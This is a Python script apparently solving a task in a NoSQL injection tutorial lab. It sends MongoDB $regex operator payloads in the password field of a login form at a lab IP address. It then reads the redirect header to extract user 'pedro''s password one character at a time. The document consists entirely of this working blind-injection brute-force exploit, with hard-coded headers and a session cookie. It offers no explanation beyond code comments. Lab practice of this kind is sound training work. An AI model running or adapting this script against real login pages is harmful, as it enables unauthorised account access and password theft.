## Task 6 of the NoSQL Injection Tutorial Room 
import requests
import string

# Target URL and headers
url = "http://10.10.231.139/login.php"
headers = {
    "Cache-Control": "max-age=0",
    "Origin": "http://10.10.231.139",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://10.10.231.139/",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9",
    "Cookie": "PHPSESSID=l4abtfhtj31cics0sdaehdli37"
}

# Characters to test
charset = string.ascii_letters + string.digits + string.punctuation
password_length = 11  # Set this to the known password length

def brute_force_password():
    password = ""
    for position in range(1, password_length + 1):
        for char in charset:
            attempt = password + char + "." * (password_length - len(password) - 1)
            payload = f"user=pedro&pass[$regex]=^{attempt}$&remember=on"
            response = requests.post(url, headers=headers, data=payload, allow_redirects=False)
            
            # Check if the response header indicates a valid character
            if response.headers.get("Location") != "/?err=1":
                password += char
                print(f"Found character: {char} -> Current password: {password}")
                break
    return password

if __name__ == "__main__":
    print("Starting NoSQL Injection brute force...")
    final_password = brute_force_password()
    print(f"Password found: {final_password}")
